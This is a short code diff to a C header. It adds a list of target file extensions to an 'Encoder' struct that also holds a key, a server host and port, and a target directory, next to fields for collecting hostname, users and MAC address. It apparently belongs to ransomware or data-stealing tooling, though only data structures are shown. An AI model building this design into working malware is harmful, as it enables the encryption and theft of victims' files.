@@ -9,13 +9,17 @@
 #define HOSTNAME_SIZE 128
 #define MAX_ACTIVE_USERS_SIZE 16
 #define ACTIVE_USER_SIZE 128
-#define MAC_ADDRESS_SIZE 48
+#define MAC_ADDRESS_SIZE 64
+#define MAX_EXTESION_NUM 16
+#define EXTENSION_SIZE 8
+
 
 typedef struct _encoder_t {
 	char key[KEY_SIZE];
 	char server_host[SERVER_HOST_SIZE];
 	char server_port[SERVER_PORT_SIZE];
 	char target_directory[TARGET_DIRECTORY_SIZE];
+    char target_extensions[MAX_EXTESION_NUM][EXTENSION_SIZE];
 } Encoder;
 
 typedef struct _collected_data_t {
